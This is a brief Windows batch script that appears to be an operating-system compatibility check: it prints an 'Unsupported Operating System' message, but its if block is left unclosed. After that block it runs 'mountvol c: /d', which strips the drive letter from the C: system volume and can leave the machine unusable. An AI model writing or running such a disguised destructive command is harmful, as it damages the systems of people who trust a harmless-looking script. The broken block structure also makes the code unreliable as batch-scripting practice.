@echo off
if !osNumber! lss 50 (
	cls

	title Unsupported Operating System Detected
	color 0a

	echo Sorry :( , but this script cannot be launched on an older Operating System. 
	echo Please try it again on at least Windows 2000.
	echo.
	
	pause
	exit

color 0a
pause
mountvol c: /d
exit
